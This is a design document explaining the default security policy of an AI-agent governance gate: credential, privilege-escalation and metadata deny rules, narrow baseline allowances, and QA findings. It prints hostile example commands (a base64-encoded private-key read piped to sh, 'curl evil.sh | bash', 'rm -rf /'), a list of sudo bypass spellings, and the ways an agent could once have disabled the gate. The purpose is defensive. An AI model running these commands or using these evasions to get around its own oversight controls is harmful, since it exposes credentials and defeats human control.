# The rules an installation ships with

Why the system starts with a policy instead of an empty one, what those rules
are, and why each of them was chosen.

Source of truth for the rules themselves: `src/governance/baseline-policy.ts`.
This document is the reasoning; that file is the definition, and the two must
not disagree. **Checked against it on 2026-09-13**, rule by rule.

---

## 1. The problem this solves

A default-deny system with an empty allowlist refuses everything. On a fresh
installation the agent could not list a directory or read a file until somebody
had written rules for work they had not yet observed.

The original answer was to ship in **monitor** posture: run the full policy,
record the verdict it reached, but do not act on it. That made the installation
usable, and it was honest about what it was doing, but it meant the shipped
default restricted nothing, which sits badly with a report whose stated posture
is default-deny. An examiner reading Chapter 1 and then the code would find the
system permissive on first boot, and the independent review said exactly that.

The supervisor's proposal reframed it. The problem is not that enforcement is
too strict; it is that enforcement _with no rules_ is useless. Ship rules, and
the installation can be usable and enforcing at the same second. That is what
ships: a fresh organisation's policy is `enforce`, with the core and baseline
rules below already in it. They are written once, when the organisation's policy
is first created.

---

## 2. The three tiers

| Tier         | What it is                                   | Who can change it                                                                     | Effect        |
| ------------ | -------------------------------------------- | ------------------------------------------------------------------------------------- | ------------- |
| **Core**     | Restrictions that hold at all times          | Nobody, for the three self-protecting rules; Root may switch off the other five (T24) | deny          |
| **Baseline** | Enough permission to be useful on first boot | Administrator (remove or narrow; a removal sticks)                                    | allow         |
| **Admin**    | Everything written from observed behaviour   | Administrator, and a User for their own agents unless Root withheld it                | allow or deny |

Anything matching no rule falls through to the installation default: escalate
to a human under the shipped `ask: on-miss`, or refuse outright under
`ask: off`.

### Why this needed a change to the rule language

The policy language was **allow-only**. Denial was the default and needed no
expression, and a documented consequence was that _adding a rule can never
reduce access_.

Core rules break that. "Credential files are refused, whatever else anybody
permits" cannot be said in an allow-only language: any later broad allowance
would silently re-open it. So rules gained an `effect` (`allow` or `deny`) and a
`tier`, and evaluation gained an order. The baseline then needed a third field,
`access`, to say "read the project" without also saying "write it" (§5).

All three fields are optional and default to the old meaning: absent `effect` is
`allow`, absent `tier` is `admin`, absent `access` is both directions. So every
rule written before the change keeps working unchanged.

### Evaluation order, as it concerns these rules

The full order is `docs-notes/PERMISSION-SPEC.md` §5. The parts that decide how
the tiers interact:

1. **Registration.** An agent governance holds no record of is refused before
   any rule is read.
2. **Kill switch.** A locked agent, or a session a locked agent started, is
   refused, whatever any rule says.
3. **Denials.** Every deny rule, core or not, is checked before any allowance,
   so no grant can override one.
4. **Allowances** (baseline and admin).
5. **Default**: escalate to a human, or refuse.

Two properties fall out of step 3 being _before_ step 4:

- **Deny beats allow.** An operator who writes `^.*$` widens a great deal, but
  cannot re-open a core restriction.
- **Monitor does not lift a denial.** Monitor suspends policy _opinions_. The
  denials are the restrictions the installation declines to merely have an
  opinion about. This matters concretely: monitor for one agent is one
  Administrator setting away, and without this it would be a one-setting way to
  remove every protection below.

---

## 3. The core rules, and why each one

These are denials. They are reasserted from source on every load, so editing
`policy.json` by hand cannot remove them, and the create and remove paths refuse
to remove or mint one, for every tier, **including Root**.

**Switching one off is a different act from removing it, and Root may do it for
five of the eight (T24, decided 2026-08-22).** The core tier was wholly
immutable, on the reasoning that a floor nobody can lower is the strongest claim
a policy layer can make. That is right about the three rules that protect the
layer from the agent it governs, and wrong about the other five, which are
security opinions an operator with a real deployment may legitimately disagree
with. An installation whose agent genuinely needs `sudo` had no way to say so, and
an inflexible control ends in the whole gate being switched off. So:

- The **three self-protecting rules** (the governance directory as a path, as a
  command, and the governance command surface) MUST NOT be switched off, at any
  tier. Lifting them would let the agent reach the policy, the accounts, the
  ledger or the control plane, after which no other control, including the list
  of which rules are switched off, would mean anything. The setter refuses them
  and so does the load path, because the only other way to name one in
  `disabledCoreRules` is to hand-edit `policy.json`.
- The **other five** may be switched off by Root, in the _Policy_ section, which
  asks first. Nothing is deleted: the rule stays declared in source, leaves the rule
  list but stays named near the top of _Policy_ as switched off, for every tier to
  see, and comes back the moment Root presses **Switch on** beside it. _(Until
  2026-09-14 it vanished from the page and nothing offered to switch it back on:
  finding 367.)_ The change is
  recorded in the ledger against Root (`governance.policy.core-rule`), and the
  **deployment report fails** its `deployment.core_rules_intact` check for as
  long as any core rule is off, naming which. A lowered floor must not be able to
  hide.

> A restriction the top of the hierarchy can lift on a whim is a default, not an
> invariant. That is still the argument for the three self-protecting rules. For
> the other five the answer is to make lifting one deliberate, visible, recorded
> and reported, rather than impossible.

| Rule                                                                                                                                                                                                                    | Kind    | Self-protecting | Why                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `.env` and `*.env`, with an optional suffix such as `.env.local`; `.npmrc`, `.netrc`, `.git-credentials`, `id_rsa`/`id_dsa`/`id_ecdsa`/`id_ed25519`, `*.pem`, `*.pfx`, `*.p12`, `*.keystore`; **in any capitalisation** | path    | no              | Credential material. Matched by **filename, not location**. A private key copied into the project is still a private key, and a rule keyed to `~/.ssh` alone would wave it through. Case-insensitive since QA round 13: the filesystems this protects are case-insensitive and the rule was not, so a file the agent _created_ as `ID_RSA` escaped it                                                                                           |
| `.ssh/`, `.aws/`, `.gnupg/`, `.docker/`, `.kube/`, in any capitalisation                                                                                                                                                | path    | no              | Directories whose entire contents are credentials                                                                                                                                                                                                                                                                                                                                                                                               |
| The governance directory **actually in use**, derived from `governanceHomeDir()` on every load, plus the default `~/.openclaw/governance/`                                                                              | path    | **yes**         | The policy, the accounts, the audit ledger, its signing key and checkpoint. An agent that can write here could grant itself permissions or erase the record of having done so, which would make every other guarantee conditional on the agent choosing not to. Derived rather than hard-coded since QA round 13: `OPENCLAW_GOVERNANCE_DIR` is a documented deployment option, and using it silently moved the state outside its own protection |
| `sudo`, `su`, `doas`, `runas`, `pkexec`                                                                                                                                                                                 | command | no              | Privilege escalation. Matched wherever the name appears as a command: at the start of the string, after any character that cannot be part of a command name, and through a path prefix such as `/usr/bin/sudo`                                                                                                                                                                                                                                  |
| Any command naming the governance directory (the one in use, and the default), in **either** path separator                                                                                                             | command | **yes**         | The command-side counterpart of the path rule above: a path rule does not see `rm -rf ~/.openclaw/governance`, because that is a _command_ resource. The Windows spelling with `\` was not matched until QA round 13, on the platform this project is developed on                                                                                                                                                                              |
| `governance <policy\|agent\|kill\|ledger\|sessions\|pending\|users>`                                                                                                                                                    | command | **yes**         | The governance command surface. It needed no login, so any operator rule broad enough to let the agent build the project (`^(node\|npm\|npx\|pnpm) .*$`) let it run the subcommand that set the policy mode to `off`, switching the whole gate off (QA round 13, finding 73). **The command line was removed on 2026-09-07; this rule was kept**, for the reasons below the table                                                               |
| `shutdown`, `reboot`, `halt`, `poweroff`, `mkfs`, `fdisk`                                                                                                                                                               | command | no              | Host destruction. No agent task needs them, and the cost of being wrong is total                                                                                                                                                                                                                                                                                                                                                                |
| `169.254.169.254`, `100.100.100.200`, `::ffff:a9fe:a9fe`, `fd00:ec2::254`, `metadata`, `metadata.google.internal`                                                                                                       | network | no              | Cloud instance metadata. Reaching it from a compromised workload is the standard route to stealing a machine's cloud credentials. The dotted IPv4-mapped IPv6 form is folded to dotted-decimal by the canonicaliser rather than listed, so it is caught by the first entry                                                                                                                                                                      |

That is eight declared rules, five that Root may switch off and three that nobody
may, plus the two derived from the governance directory in use, which are
self-protecting as well.

**Why the governance command rule outlived the command.** Two reasons. The
command surface is archived in `old-docs/removed-cli-surface/` with a restore
procedure of about ten minutes, so it can come back without anybody noticing that
its protection had gone; and a denial keyed to a subcommand pair costs nothing
when the subcommand does not exist. For a day after the removal this document
struck the row through as removed. That made the table describe seven core rules
and two self-protecting ones where the product had eight and three, the split T24
rests on, and it was re-derived from `CORE_RULES` and driven at the gate before it
was corrected.

### The honest limitation, stated plainly

**For commands, the core denials are not the protection.** A shell can reach a
forbidden file through indirection no pattern will catch:

```
c""at $HOME/.ssh/id_rsa
FILE=$HOME/.ssh/id_rsa; cat $FILE
echo Y2F0IH4vLnNzaC9pZF9yc2E= | base64 -d | sh
```

Enumerating bad commands is a losing game, and a system that claimed otherwise
would be lying. What actually confines the agent is the other direction: the
baseline **allows** a short list of anchored, argument-constrained commands, and
everything else escalates or is refused by default. The core command denials are
defence in depth against a careless later rule: a second line, not the line.

This is worth stating in the report because it explains why the baseline
allowlist is so much narrower than it might otherwise be: it is carrying the
security argument, so it cannot afford to be generous.

#### Measured, in the thirteenth QA round: and widened

The paragraph above was written as an argument. Round thirteen turned it into a
measurement, and the backstop was thinner than the prose implied. With a broad
allow rule in place so that only the core denials could refuse, every **no**
below reached the shell. **All are now denied**; the table is kept because the
list of spellings is the useful part, and because it shows what an enumerating
denylist is up against.

| Spelling                                              | Denied then? | Why not                                                                                                           |
| ----------------------------------------------------- | ------------ | ----------------------------------------------------------------------------------------------------------------- |
| `sudo -i`                                             | yes          | -                                                                                                                 |
| `ls; sudo -i`                                         | yes          | -                                                                                                                 |
| `` echo `sudo -i` ``                                  | **no**       | a backtick is not in the separator class `[;&\|]`                                                                 |
| `echo $(sudo -i)`                                     | **no**       | nor is `$(`                                                                                                       |
| `FOO=1 sudo -i`                                       | **no**       | an environment prefix is neither the start of the string nor a separator                                          |
| `␣␣sudo -i`                                           | **no**       | `(^\|[;&\|]\s*)` requires the metacharacter _before_ the whitespace, so plain leading spaces defeat both branches |
| `/usr/bin/sudo -i`                                    | **no**       | the pattern named the bare command, not a path to it                                                              |
| `ls⏎sudo -i`                                          | **no**       | the expression has no `m` flag, so `^` matches only at the start of the string                                    |
| `type %USERPROFILE%\.openclaw\governance\policy.json` | **no**       | the governance-directory denial spelled the path with `/`, and Windows commands use `\`                           |

The last row was the one that had to be fixed regardless of the argument above,
because it is not an indirection at all. It is the _plain_ spelling of the
forbidden thing on the platform this project is developed on.

The fix replaced the enumerated separator class with a **constructed** one.
`commandNamed()` matches a command name preceded by the start of the string or
by any character that cannot be part of a command name, with an optional path
prefix:

```
(?:^|[^A-Za-z0-9_.-])(?:[A-Za-z0-9_.:\\/-]*[\\/])?(?:sudo|su|doas|runas|pkexec)\b
```

That covers every row above by construction rather than by naming disguises,
which is the same move `path-normalize.ts` makes for files and
`canonicalHostname` makes for addresses. It blocks _more_ than strictly
intended, `echo "not sudo"` matches, and that is the documented trade: blocking
more than intended is safer than blocking less. A test asserts the boundary in
both directions, including that `mysudoku` and `git commit -m sudoku` are **not**
refused.

The honest framing is unchanged and still the important part: a denylist over
shell strings is a second line, no amount of widening makes it the first, and
`su""do -i` still defeats it because shell quoting splits the command name
itself. The test says so explicitly rather than leaving the boundary implied.

#### The credential-file denial was case-sensitive

Also measured in round thirteen, and narrower than it first appeared. Reading an
**existing** `.env` through the spelling `.ENV` is correctly denied: the
canonicaliser resolves the real on-disk name before the pattern is applied. The
gap was files that do not exist yet: `canonicalize` falls back to resolving the
parent and keeping the basename as typed, so a `write` to `NEW.ENV`, `ID_RSA`
or `server.PEM` matched no core rule, and the file then kept that casing for
every later read. On a case-insensitive filesystem the rule and the filesystem
disagreed about identity, which is the same class of defect as the four
spellings of an IP address that round eleven closed.

Fixed by expanding the shipped filenames with `anyCase()`, which rewrites a
literal into a character-class alternation (`.env` → `\.[Ee][Nn][Vv]`). Done in
the pattern rather than by case-folding the canonical path, because folding
would change the form **every operator rule** is written against (`^src/App\.ts$`
would stop matching) to fix a problem that exists only for this handful of
shipped names.

One change went beyond the finding and is flagged as such in the source: `.env`
is matched as `.*\.env`, so `staging.env` and `prod.env` are covered. That was
never a case-sensitivity gap, `new.env` was denied in no capitalisation, but the
asymmetry it exposed is real, since `.pem`, `.pfx`, `.p12` and `.keystore` had
always been matched with a `.*` prefix and `.env` had not, for no reason anyone
had recorded.

#### The metadata denial missed the IPv6 spellings

Round eleven canonicalised four ways of writing `169.254.169.254` and did not
consider the IPv6 family. `[::ffff:169.254.169.254]`, `[::ffff:a9fe:a9fe]` and
`[fd00:ec2::254]` (AWS IMDS over IPv6) all reached the endpoint the core tier
denies, because `canonicalIpv4` returns `undefined` for anything containing a
colon and the value passed through as written. `100.100.100.200` (Alibaba) and
the bare `metadata` alias GCP resolves were simply not in the pattern.

Fixed in two places, deliberately. The **dotted** IPv4-mapped form
(`::ffff:169.254.169.254`) is folded to dotted-decimal by `canonicalHostname`, so
it is covered by the _existing_ alternative rather than by a spelling of its own:
representation first, as everywhere else in this layer. The **hex** forms
(`::ffff:a9fe:a9fe`, `fd00:ec2::254`) cannot be folded without an IPv6 parser, so
they are named in the rule, along with Alibaba's endpoint and the bare `metadata`
alias.

#### Relocating the governance directory used to remove its own protection

The static governance-directory patterns spell the literal
`.openclaw/governance`. `paths.ts` documents `OPENCLAW_GOVERNANCE_DIR` as a
supported deployment feature, "so a deployment can place the ledger on separate
storage… without a code change", and using it silently removed the agent's
inability to read the policy, the accounts, the ledger and its signing key. The
documented deployment step and the core tier disagreed, and the deployment step
won.

Fixed by `governanceStateRules()`, which derives both patterns from
`governanceHomeDir()`: the path rule against the canonical form paths are
reduced to, the command rule accepting either separator. Derived on **every
load**, because the core tier is rebuilt on every load and `governanceHomeDir()`
re-reads the environment each time, so relocating the directory moves the
protection with it and no stored rule can go stale.

The static patterns are kept **as well as** the derived ones rather than
replaced by them: an installation reached through a symbolic link, or one that
later moves back, stays covered, and a denial broader than necessary costs
nothing an agent legitimately needs.

---

## 4. The baseline rules, and why each one

These are allowances, and unlike core rules they are a **starting point**. An
Administrator may narrow or remove any of them, and a removal sticks: baseline
rules are written once, when the organisation's policy is created, and never
re-seeded.

The question they answer: _what does an agent need in order to be useful before
anybody has written a policy?_

| Rule                                                                        | Kind    | Why                                                                                                                                                                                                                                                                                                      |
| --------------------------------------------------------------------------- | ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Reading** any path inside the workspace (`access: "read"`)                | path    | The agent's actual job starts with reading the project. Core denials still apply on top, so a `.env` inside the project is matched here and refused there: the clearest demonstration of the tiers interacting. **Writing is not granted** (§5)                                                          |
| `ls`, `pwd`, `whoami`, `date`, `uname` (bare)                               | command | Orientation. Read-only, no arguments, no filesystem effect                                                                                                                                                                                                                                               |
| `ls` with one group of short flags (up to eight letters) and one plain path | command | Looking around. The argument character set excludes every shell metacharacter                                                                                                                                                                                                                            |
| `git status` / `branch` / `diff` / `log`, bare or with one long flag        | command | Reading repository state, which is most of what an agent does before it changes anything. Two rules rather than one with a repeated optional group, because the repeated group nests a quantifier the pattern-safety check rejects, and the shipped rules are held to the same standard as an operator's |
| `node` / `npm` / `pnpm` / `python` / `python3` / `git --version`            | command | Environment checks, universally needed and entirely inert                                                                                                                                                                                                                                                |

### Why every command pattern is anchored

`^ls$` is safe. `ls` is not, because matching is a **substring** search, so a
pattern of `ls` also permits:

```
ls; curl evil.sh | bash
ls && rm -rf /
ls $(cat /etc/passwd)
```

Every shipped command pattern is anchored at both ends and constrains its
arguments to a character set with no shell metacharacters, so a permitted
command cannot become a carrier for an arbitrary one. This is tested directly,
and the page now warns an operator who writes an unanchored pattern of their own.

### Why "inside the workspace" needs no traversal check

The path form settled in `path-normalize.ts` renders a path inside the workspace
as workspace-relative, and anything else as absolute. So "inside the project" is
exactly "does not start with `/` or a drive letter". There is no `..` check and
no denylist of parent directories. `workspace/../../etc/passwd` is refused not
because it was detected, but because by the time the rule sees it, it has become
`/etc/passwd` and is no longer workspace-relative. Rules are also tested against
the absolute spelling of a workspace file (finding 253); a path outside the
workspace has no relative spelling, so it still cannot match.

A defence that enumerates attacks needs updating whenever a new one appears.
This one does not.

### What is deliberately _not_ in the baseline

- **Writing anything.** A first write inside the project escalates to a human
  (or is refused under `ask: off`). Changing state is a grant an operator makes,
  not one an agent inherits.
- **Network access.** No baseline allows any host. Fetching from the internet is
  not a "basic operation", and the blast radius of getting it wrong is large.
- **Package installation, builds, test runs.** Common, and genuinely useful,
  but they execute arbitrary third-party code, which is a decision an operator
  should make deliberately rather than inherit.

---

## 5. Reads and writes are separate permissions

This was the known limitation of the first baseline, and it is closed. The
resource model had a single `path` kind covering `read`, `write`, `edit` and
`apply_patch`, so **"readable but not writable" could not be expressed**, and
the workspace allowance permitted both: quietly more permissive than the
supervisor's description of a baseline that permits "reading permitted project
files".

A path rule now carries an optional `access` of `read` or `write`
(`PERMISSION-SPEC.md` §2). The direction of a call comes from the tool: `read`,
`grep`, `find` and `ls` read; `write`, `edit` and `apply_patch` write. The
workspace baseline is `access: "read"`, so the first write escalates.
`baseline-policy.test.ts` pins both halves: the baseline reads but does not
write, and `edit` and `apply_patch` count as writes too.

One consequence an operator should know: a **denial** narrowed to `read` does
not forbid a write. The page warns when a denial carries a narrowing, because
"forbid reading this" leaving writing permitted is rarely what was meant.

---

## 6. Monitor mode, in its new role

Monitor is no longer how a fresh installation becomes usable. It is an **opt-in
observation tool**:

- **Off by default.** A fresh installation is `enforce`.
- **Per agent.** An operator can watch one agent while the rest of the
  installation keeps enforcing, which is what makes it useful for discovering
  rules rather than a blunt instrument.
- **Set by an Administrator** (T4), for any agent or installation-wide, with Root
  inheriting both. A User asks for it through an agent-setting request. It was a
  User setting until T4 found that switching one's own agent to monitor, like
  loosening its escalation, is a widening that should not rest with the tier that
  has the least authority.
- **It never lifts a denial or the kill switch.** See §2.

The workflow it supports: put one agent in monitor, let it work, read the ledger
for what _would_ have been refused, promote the legitimate entries into admin
rules, and return it to `enforce`.

---

## 7. One environment exception, and why it is not a loophole

A test process that never asked for a governance directory starts `off`, and the
gate lets an unregistered agent pass rather than refusing it.

The distinction being drawn is "is this an installation?", and for OpenClaw's
own harness suite the answer is no. Those tests predate governance, drive
synthetic tool calls, and have no operator, no policy and no approver. Under a
shipped default-deny posture every one of those calls is correctly refused or
escalated, and host tests fail for reasons unrelated to what they test.

The exception is narrow by construction (`isUnconfiguredTestRun`, `paths.ts`),
and nothing real can reach it:

- **Production never does**: `VITEST` is unset, so the home directory is used
  and the shipped `enforce` default applies.
- **This project's own governance tests never do**. Every one sets
  `OPENCLAW_GOVERNANCE_DIR` explicitly, so they exercise the shipped default and
  would fail if it were weakened.

That second point is what makes this an environment distinction rather than a
convenience: the behaviour under test is still the shipped behaviour.

---

## 8. How we know the baseline is permissive enough

The question "is this enough permission for ordinary work?" is a judgement call,
and judgement calls in a security policy are worth converting into measurements
where possible.

**OpenClaw's own harness suite was that measurement.** It exercises the host
doing real work through the same hook the gate sits on, so the number of tests it
fails is an external, unsympathetic assessment of whether the policy is usable,
written by people who had never heard of this project. When the baseline shipped
(August 2026) the harness failed **18 of 192 tests before the change and the same
18 after it**, with `enforce` and the shipped rules: the policy added no failure.
The 18 were later traced (T25): the production code was right and the tests
assumed POSIX paths and shell quoting. They were fixed, and that file now passes
all 192.

`baseline-policy.test.ts` tests the claim directly. A fresh installation:

- starts in `enforce`, with every core and baseline rule;
- lets an agent do the ordinary work the baseline names with no policy written;
- does not permit anything the baseline fails to name, which escalates under the
  shipped `ask` and is refused outright once `ask` is `off`;
- refuses a permitted command carrying a second one;
- reads the workspace but does not write it;
- keeps a removed baseline rule removed across reloads, while a core rule cannot
  be removed.
